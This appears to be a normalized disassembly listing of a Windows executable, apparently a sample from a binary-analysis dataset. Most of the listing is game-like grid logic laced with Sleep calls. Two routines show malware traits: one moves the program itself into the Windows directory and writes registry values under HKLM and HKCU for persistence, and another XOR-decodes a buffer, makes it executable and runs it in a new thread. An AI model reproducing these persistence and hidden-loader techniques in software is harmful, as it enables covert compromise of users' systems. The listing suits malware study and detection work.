mov ebx ecx
push 0x30
call sub_4044f2
pop ecx
lea esi [ ebx + 0x4e4 ]
mov ecx [ ebp + 0x8 ]
mov edi eax
mov [ ebp - 0x4 ] 0xfffffb18
mov [ ebp - 0x8 ] 0xfffffb0c
mov [ ecx ] eax
sub [ ebp - 0x4 ] ebx
movsd [ edi ] [ esi ]
sub [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] 0x3
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea esi [ ebx + 0x4f4 ]
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ ebp - 0x4 ]
add eax [ ebx + 0x4e4 ]
mov edi [ ecx ]
add edx esi
push 0x3e8
mov [ edx + edi ] eax
mov eax [ ebp - 0x8 ]
mov edx [ esi ]
mov edi [ ecx ]
add edx [ ebx + 0x4e8 ]
add eax esi
mov [ eax + edi + 0x10 ] edx
mov edx [ esi + 0x4 ]
add edx [ ebx + 0x4ec ]
mov ecx [ ecx ]
mov [ eax + ecx + 0x14 ] edx
call [ Sleep@IAT ]
add esi 0xc
dec [ ebp - 0xc ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x4
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_403334
push ebp
mov ebp esp
sub esp 0x34
push ebx
mov ebx ecx
push esi
push edi
lea esi [ ebx + 0x4e4 ]
lea edi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x34 ] eax
mov eax [ ebp + 0xc ]
add [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
add [ ebp - 0x2c ] eax
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4f4 ]
mov [ ebp + 0x8 ] 0x3
mov eax [ edi - 0x4 ]
push 0x3e8
add eax [ ebp - 0x34 ]
mov [ esi - 0x4 ] eax
mov eax [ edi ]
add eax [ ebp - 0x30 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call [ Sleep@IAT ]
add edi 0xc
add esi 0xc
dec [ ebp + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x34 ]
push 0x4
push eax
mov ecx ebx
call sub_4035b0
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
mov edi [ ebp - 0x4 ]
lea esi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov esi [ ebp - 0x4 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4f4 ]
mov [ ebp + 0x10 ] 0x3
mov eax [ edi - 0x4 ]
push 0x3e8
add eax [ ebp - 0x34 ]
mov [ esi - 0x4 ] eax
mov eax [ edi ]
add eax [ ebp - 0x30 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call [ Sleep@IAT ]
add edi 0xc
add esi 0xc
dec [ ebp + 0x10 ]
jne r-xdata
push 0x4
lea esi [ ebp - 0x30 ]
pop edi
mov eax [ esi - 0x4 ]
push 0x3e8
lea eax [ eax + eax * 4 ]
add eax [ esi ]
lea eax [ eax + eax * 4 ]
shl eax 0x1
sub eax [ esi + 0x4 ]
mov [ ebx + eax * 4 - 0xe8 ] 0x1
call [ Sleep@IAT ]
add esi 0xc
dec edi
jne r-xdata
xor al al
sub_403449
push ebp
mov ebp esp
sub esp 0x70
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
imul eax eax
imul edx edx
add eax edx
mov edx [ ebp + 0x10 ]
imul edx edx
add eax edx
push ebx
push esi
cmp eax 0x1
push edi
mov [ ebp - 0x4 ] ecx
jne r-xdata
xor al al
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ ecx + 0x4e4 ]
lea edi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp + 0x8 ] eax
mov ebx [ Sleep@IAT ]
movsd [ edi ] [ esi ]
push 0x9
lea esi [ ecx + 0x4f0 ]
pop ecx
lea edi [ ebp - 0x34 ]
[ edi ] [ esi ]
je r-xdata
cmp [ ecx + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x3
lea esi [ ebp - 0x30 ]
pop edi
cmp [ ecx + 0x504 ] eax
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push 0x3
lea esi [ ebp - 0x2c ]
pop edi
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
imul ecx [ ebp + 0x8 ]
imul eax [ ebp + 0x8 ]
neg ecx
mov [ esi + 0x4 ] ecx
push 0x3e8
mov [ esi ] eax
call ebx
add esi 0xc
dec edi
jne r-xdata
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor esi esi
push 0x3
lea esi [ ebp - 0x34 ]
pop edi
mov ecx [ esi ]
mov eax [ esi - 0x8 ]
imul ecx [ ebp + 0xc ]
imul eax [ ebp + 0xc ]
neg ecx
mov [ esi - 0x8 ] ecx
push 0x3e8
mov [ esi ] eax
call ebx
add esi 0xc
dec edi
jne r-xdata
mov eax [ ebp + esi - 0x34 ]
push 0x3e8
add eax [ ebp - 0x40 ]
mov [ ebp + esi - 0x64 ] eax
mov eax [ ebp + esi - 0x30 ]
add eax [ ebp - 0x3c ]
mov [ ebp + esi - 0x60 ] eax
mov eax [ ebp + esi - 0x2c ]
add eax [ ebp - 0x38 ]
mov [ ebp + esi - 0x5c ] eax
call ebx
add esi 0xc
cmp esi 0x18
jle r-xdata
mov ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x70 ]
push 0x4
push eax
mov ecx ebx
call sub_40363e
test al al
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
imul ecx [ ebp + 0x10 ]
imul eax [ ebp + 0x10 ]
neg ecx
mov [ esi + 0x4 ] ecx
push 0x3e8
mov [ esi ] eax
call ebx
add esi 0xc
dec edi
jne r-xdata
push 0x9
lea esi [ ebp - 0x34 ]
pop ecx
lea edi [ ebx + 0x4f0 ]
[ edi ] [ esi ]
push [ ebp - 0x8 ]
mov ecx ebx
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_403334
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_4035b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea edi [ eax - 0x1 ]
xor esi esi
test edi edi
jl r-xdata
and [ ebp + 0xc ] 0x0
test edi edi
jl r-xdata
lea edx [ ebx + 0x8 ]
mov al 0x1
lea esi [ ebx + 0x8 ]
xor al al
jmp r-xdata
inc esi
add edx 0xc
cmp esi edi
jle r-xdata
cmp eax 0x5
jg r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ edx - 0x8 ]
lea eax [ eax + eax * 4 ]
add eax [ edx - 0x4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x1
sub eax [ edx ]
cmp [ ecx + eax * 4 - 0xe8 ] 0x1
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax 0x1
jl r-xdata
cmp eax 0x5
jg r-xdata
mov eax [ esi ]
cmp eax 0xfffffff6
jl r-xdata
cmp eax 0xffffffff
jg r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc [ ebp + 0xc ]
add esi 0xc
cmp [ ebp + 0xc ] edi
jle r-xdata
mov eax [ esi - 0x8 ]
cmp eax 0x1
jl r-xdata
sub_40363e
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
test edi edi
mov ebx ecx
jl r-xdata
mov esi [ ebp + 0x10 ]
push 0xc
push 0x0
push esi
call sub_4043c0
add esp 0xc
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov al 0x1
mov eax [ ebp + 0x8 ]
inc edi
lea edx [ eax + 0x4 ]
inc [ ebp - 0x4 ]
add esi 0xc
cmp [ ebp - 0x4 ] edi
jle r-xdata
cmp eax 0x5
jg r-xdata
cmp ecx 0x5
jle r-xdata
mov eax ebx
sub eax ecx
cmp eax [ esi ]
jg r-xdata
mov eax [ esi - 0x8 ]
cmp eax 0x1
jl r-xdata
mov ecx [ esi - 0x4 ]
cmp ecx 0x1
jl r-xdata
mov ecx [ edx ]
cmp ecx ebx
jge r-xdata
push 0x5
pop eax
sub eax ecx
cmp eax [ esi ]
jge r-xdata
mov [ esi ] eax
cmp ecx 0x5
jg r-xdata
push 0x5
pop eax
cmp ecx eax
jle r-xdata
mov eax ebx
sub eax ecx
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ esi ]
cmp edx 0xffffffff
jg r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xfffffff6
jge r-xdata
sub eax ecx
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
cmp edx 0xfffffff6
jl r-xdata
or eax 0xffffffff
cmp ecx eax
jle r-xdata
push 0xfffffff6
pop eax
sub eax [ edx ]
cmp eax [ esi + 0x8 ]
jle r-xdata
lea ecx [ ecx + eax * 4 ]
add eax ecx
lea eax [ eax + eax * 4 ]
shl eax 0x1
sub eax edx
cmp [ ebx + eax * 4 - 0xe8 ] 0x1
je r-xdata
add edx 0xc
dec edi
jne r-xdata
sub eax ecx
cmp eax [ esi + 0x8 ]
jge r-xdata
push 0xfffffff6
pop eax
sub eax ecx
jmp r-xdata
xor al al
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov ecx [ edx - 0x4 ]
push 0x1
pop ebx
cmp ecx ebx
jge r-xdata
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_403763
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
push 0xffffffd8
pop ebx
mov [ ebp - 0xc ] ebx
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x1 ] 0x1
xor edi edi
and [ ebp - 0x1 ] 0x0
inc eax
add esi 0x28
cmp eax 0x4
jle r-xdata
xor eax eax
mov esi edi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx esi
sub edx ebx
cmp [ edx + ecx + 0x8 ] 0x0
je r-xdata
jmp r-xdata
add ebx 0x4
cmp ebx 0xfffffffc
mov [ ebp - 0xc ] ebx
jle r-xdata
inc [ ebp - 0x8 ]
add edi 0xc8
cmp edi 0x320
jle r-xdata
cmp [ ebp - 0x8 ] 0x3
jg r-xdata
push 0x5
lea edx [ ecx + 0xc ]
pop esi
xor edi edi
and [ edx ] 0x0
add edx 0x28
dec eax
jne r-xdata
dec esi
jne r-xdata
mov edx edi
sub edx ebx
lea esi [ edx + 0x4 ]
mov edx edi
sub edx ebx
add edi 0x28
mov esi [ esi + ecx ]
dec eax
mov [ edx + ecx + 0x8 ] esi
jne r-xdata
cmp edi 0x320
jle r-xdata
push 0x5
pop eax
mov ebx [ ebp - 0xc ]
sub ebx 0x4
push 0x5
pop eax
add ebx 0x4
jmp r-xdata
cmp ebx 0xfffffff8
jg r-xdata
sub_40381c
push esi
push edi
mov esi ecx
xor edi edi
mov eax edi
pop edi
pop esi
retn
inc edi
jmp r-xdata
push 0xffffffff
push 0x0
push 0x0
mov ecx esi
call sub_403334
test al al
je r-xdata
sub_40385a
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xa
pop eax
pop edi
pop esi
pop ebx
leave
retn
inc ebx
add edi 0x28
cmp ebx 0x4
jle r-xdata
mov edx edi
sub edx esi
cmp [ edx + ecx + 0x34 ] 0x1
je r-xdata
add [ ebp - 0x4 ] 0xc8
cmp [ ebp - 0x4 ] 0x320
jle r-xdata
mov edi [ ebp - 0x4 ]
mov esi eax
xor ebx ebx
shl esi 0x2
dec eax
jns r-xdata
and [ ebp - 0x4 ] 0x0
xor eax eax
sub_4038a0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x20
call sub_4044f2
mov edx [ ebp + 0x8 ]
pop ecx
fldz
mov [ edx ] eax
mov ecx [ esi + 0x4 ]
fstp [ ebp + 0x8 ]
test ecx ecx
fldz
je r-xdata
cmp ecx 0x4
jne r-xdata
cmp ecx 0x4
je r-xdata
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x4
mov ecx [ ecx + esi + 0x3f4 ]
sub ecx 0x3
mov [ ebp - 0x4 ] ecx
fild [ ebp - 0x4 ]
fadd [ ebp + 0x8 ]
fstp [ eax ]
mov eax [ esi + 0x4 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + esi + 0x3f8 ]
sub eax 0x3
mov [ ebp - 0x4 ] eax
mov eax [ edx ]
fild [ ebp - 0x4 ]
fadd st1
fstp [ eax + 0x4 ]
xor eax eax
fstp st0
fld [ r--data ]
mov [ ebp + 0x8 ] 0x3f000000
mov ecx [ esi + 0x4 ]
lea ecx [ eax + ecx * 4 ]
lea ecx [ ecx + ecx * 2 ]
fild [ esi + ecx * 4 + 0x400 ]
mov ecx [ edx ]
fadd [ ebp + 0x8 ]
fstp [ ecx + eax * 8 + 0x8 ]
mov ecx [ esi + 0x4 ]
lea ecx [ eax + ecx * 4 ]
inc eax
cmp eax 0x2
lea ecx [ ecx + ecx * 2 ]
fild [ esi + ecx * 4 + 0x404 ]
mov ecx [ edx ]
fsubr st1
fstp [ ecx + eax * 8 + 0x4 ]
jle r-xdata
push 0x4
pop eax
pop esi
fstp st0
leave
retn 0x4
sub_40399e
push ebx
push esi
push edi
mov esi [ lstrcpynA@IAT ]
mov edi 0x104
mov ebx ecx
push edi
push [ esp + 0x18 ]
lea eax [ ebx + 0x104 ]
push eax
call esi
push edi
push [ esp + 0x14 ]
push ebx
call esi
push 0x1
pop eax
pop edi
pop esi
pop ebx
retn 0x8
sub_4039ce
push ebp
mov ebp esp
sub esp 0x318
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi 0x104
push edi
lea eax [ ebp - 0x318 ]
push esi
mov edi ecx
push eax
push 0x0
mov [ ebp - 0xc ] edi
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x214 ]
push esi
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ edi + 0x104 ]
mov ebx rw-data
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x110 ]
push ebx
push eax
call sub_404720
mov edi [ MoveFileA@IAT ]
add esp 0x10
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x318 ]
push eax
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x214 ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
mov eax [ ebp - 0xc ]
add eax esi
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x110 ]
push ebx
push eax
call sub_404720
add esp 0x10
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x318 ]
push eax
call edi
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
mov esi [ lstrlenA@IAT ]
mov edi [ RegSetValueExA@IAT ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
call esi
push eax
lea eax [ ebp - 0x110 ]
push eax
push 0x1
push ebx
push [ ebp - 0xc ]
call esi
push eax
lea eax [ ebp - 0x110 ]
push eax
push 0x1
push ebx
push ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x8 ] 0xa
jl r-xdata
push [ ebp - 0x4 ]
call edi
inc [ ebp - 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call esi
test eax eax
lea eax [ ebp - 0x110 ]
push eax
jg r-xdata
cmp eax ebx
je r-xdata
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000001
call [ RegCreateKeyA@IAT ]
call esi
push eax
lea eax [ ebp - 0x110 ]
push eax
push 0x1
push ebx
push [ ebp - 0xc ]
call esi
push eax
lea eax [ ebp - 0x110 ]
push eax
push 0x1
push ebx
push ebx
jmp r-xdata
cmp [ ebp - 0x8 ] 0xa
jl r-xdata
push [ ebp - 0x4 ]
call edi
inc [ ebp - 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call esi
test eax eax
lea eax [ ebp - 0x110 ]
push eax
jg r-xdata
sub_403b7c
mov eax sub_40e89a
call sub_40425c
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
push 0x730
mov [ ebp - 0x18 ] esi
call sub_404772
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
mov ecx eax
call sub_403ca2
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x12
je r-xdata
mov edi [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
add esi 0x4
mov ecx 0x1cc
[ edi ] [ esi ]
mov ecx [ ebp - 0x10 ]
mov edi 0x1d14b
push ebx
mov esi rw-data
push edi
push esi
call sub_403cb9
push eax
call sub_404772
pop ecx
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
push eax
push edi
push esi
call sub_403cb9
lea ecx [ ebp - 0x1c ]
push ecx
push 0x40
push eax
push [ ebp - 0x14 ]
call [ VirtualProtect@IAT ]
mov eax [ ebp - 0x18 ]
push ebx
push ebx
push [ eax ]
push r-xdata
push ebx
push ebx
call [ CreateThread@IAT ]
call [ ebp - 0x14 ]
mov esi rw-data
push rw-data
push rw-data
mov ecx esi
call sub_40399e
mov ecx esi
call sub_4039ce
mov esi [ Sleep@IAT ]
mov edi 0x3e8
push edi
call esi
push edi
call esi
push edi
call esi
push edi
call esi
push edi
call esi
push edi
call esi
push edi
call esi
push edi
call esi
push edi
call esi
push ebx
call sub_404bc2
pop edi
pop esi
pop ebx
push ebp
mov ebp esp
sub esp 0x1c
push 0x0
call sub_404bc2
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
jmp r-xdata
sub_403cb9
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov ebx esi
mov eax [ esi ]
mov [ edi + 0x108 ] eax
mov eax [ esi + 0x4 ]
push [ esi ]
add eax esi
push eax
lea eax [ edi + 0x1 ]
push eax
call sub_404860
mov eax [ edi + 0x10c ]
add esi [ esi + 0xc ]
mov ebx [ ebx + 0x8 ]
add esp 0xc
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push [ ebp + 0x10 ]
mov ecx edi
push ebx
push esi
call sub_403d0a
mov [ ebp + 0x8 ] eax
sub_403d0a
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
xor esi esi
cmp [ ebp + 0x10 ] esi
mov eax [ edi + 0x108 ]
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp [ ebp + 0xc ] esi
jbe r-xdata
mov ecx [ ebp + 0xc ]
add eax ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx [ ebp + 0x10 ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
xor ecx ecx
test eax eax
jbe r-xdata
mov eax [ ebp + 0xc ]
add eax 0xffffffec
cmp esi eax
jbe r-xdata
mov eax [ ebp + 0x10 ]
add eax esi
add ebx eax
inc esi
cmp esi [ ebp + 0xc ]
jb r-xdata
push [ ebp + 0x10 ]
push rw-data
call sub_404c97
pop ecx
pop ecx
mov dl [ edi + ecx + 0x1 ]
xor dl [ ebx ]
inc ecx
cmp ecx [ ebp - 0x4 ]
mov [ eax ] dl
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
pop ebx
sub_403e38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_403e7a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_403ec9
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404e2e
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_403eff
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_403f53
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_405630
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_403f53
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_404e2e
add esp 0x20
pop ebp
retn
sub_403f78
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40402c
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40402c
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_404e2e
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_403e7a
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4040a1
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_4056d2
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_4056d2
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_40416c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4041ae
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_40418c
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_404242
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_404286
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_405d5a
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_405c45
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_405c45
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
leave
retn
sub_4042f5
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_404312
push esi
push [ rw-data ]
call sub_406826
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
